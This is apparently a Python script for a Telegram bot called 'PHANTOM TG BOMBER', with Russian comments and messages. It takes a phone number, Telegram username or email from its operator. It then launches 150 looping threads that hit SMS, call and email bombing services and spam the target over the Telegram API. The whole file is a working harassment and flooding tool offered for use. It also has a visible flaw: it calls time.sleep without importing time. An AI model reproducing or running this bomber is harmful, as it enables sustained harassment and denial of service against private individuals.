import os
import asyncio
import threading
import requests
import random
from datetime import datetime
from telebot import TeleBot, types

BOT_TOKEN = os.getenv("BOT_TOKEN")  # ← твой токен бота
ADMIN_ID = int(os.getenv("ADMIN_ID"))  # ← твой Telegram ID

bot = TeleBot(BOT_TOKEN)

print("[+] PHANTOM TG BOMBER BOT ЗАПУЩЕН")

active_bombs = {}  # target → количество потоков

def bomb(target, threads=100):
    def worker():
        while target in active_bombs:
            try:
                # SMS бомб
                requests.post(f"https://smsbomb.ru/api?phone={target}", timeout=3)
                requests.post("https://api.callbomb.ru/call", json={"phone": target}, timeout=3)
                
                # Telegram бомб
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                            json={"chat_id": target, "text": "💣 PHANTOM BOMB 💣" * 8})
                
                # Email бомб
                requests.post("https://emailbomb.ru/send", json={"email": target}, timeout=3)
            except:
                pass
            time.sleep(random.uniform(0.4, 1.8))
    
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

@bot.message_handler(commands=['start'])
def start(message):
    text = """🔥 <b>PHANTOM BOMBER BOT</b>

Отправь мне цель для бомбинга:

• Номер телефона (+79xxxxxxxxx)
• @username
• Email

После этого используй команду /bomb"""

    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['bomb'])
def bomb_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "Доступ запрещён.")
        return

    bot.send_message(message.chat.id, "Отправь цель для бомбинга (номер / @username / email):")
    bot.register_next_step_handler(message, get_target)

def get_target(message):
    target = message.text.strip()
    
    if target.startswith("+") or target.startswith("@") or "@" in target:
        active_bombs[target] = 150  # 150 потоков по умолчанию
        
        bot.send_message(message.chat.id, f"🚀 Бомбинг запущен на цель:\n{target}\nПотоков: 150")
        
        threading.Thread(target=bomb, args=(target, 150), daemon=True).start()
        
        bot.send_message(ADMIN_ID, f"✅ Бомбинг запущен!\nЦель: {target}")
    else:
        bot.send_message(message.chat.id, "Неверный формат цели.")

@bot.message_handler(commands=['stop'])
def stop(message):
    if message.from_user.id != ADMIN_ID:
        return
    active_bombs.clear()
    bot.send_message(message.chat.id, "Все бомбинги остановлены.")

@bot.message_handler(commands=['status'])
def status(message):
    if message.from_user.id != ADMIN_ID:
        return
    if not active_bombs:
        bot.send_message(message.chat.id, "Сейчас ничего не бомбится.")
    else:
        text = "Активные бомбинги:\n\n"
        for target in active_bombs:
            text += f"🎯 {target}\n"
        bot.send_message(message.chat.id, text)

print("[+] Бот готов. Команды: /start, /bomb, /stop, /status")
bot.infinity_polling(none_stop=True)
